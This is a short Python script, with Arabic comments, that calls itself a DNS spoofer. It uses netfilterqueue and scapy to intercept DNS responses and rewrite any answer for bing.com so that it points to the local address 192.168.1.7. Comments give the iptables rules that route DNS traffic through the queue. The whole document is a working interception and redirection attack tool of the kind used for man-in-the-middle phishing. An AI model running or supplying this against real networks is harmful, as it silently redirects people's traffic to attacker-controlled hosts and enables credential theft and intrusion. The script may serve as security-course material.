import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        try:
            qname = scapy_packet[scapy.DNSQR].qname.decode('utf-8')
            print(f"[+] DNS Query for: {qname}")

            # تطابق أكثر مرونة
            if "bing.com" in qname.lower():
                print(f"[+] Spoofing target: {qname}")

                # إنشاء رد DNS مزيف
                spoofed_answer = scapy.DNSRR(
                    rrname=qname,
                    rdata="192.168.1.7",  # الـ IP اللي عايز تحول إليه الترافيك
                    ttl=1
                )

                # تعديل حزمة DNS
                scapy_packet[scapy.DNS].an = spoofed_answer
                scapy_packet[scapy.DNS].ancount = 1
                scapy_packet[scapy.DNS].qr = 1  # جعلها رد (response)
                scapy_packet[scapy.DNS].ra = 1  # recursion available

                # حذف الحقول القديمة لإعادة الحساب
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))

        except Exception as e:
            print(f"[-] Error: {e}")

    packet.accept()

# قواعد iptables الصحيحة:
# للردود الواردة (من DNS server الحقيقي):
# sudo iptables -I INPUT -p udp --sport 53 -j NFQUEUE --queue-num 0

# للطلبات الصادرة:
# sudo iptables -I OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
print("[+] DNS Spoofer is running...")
queue.run()
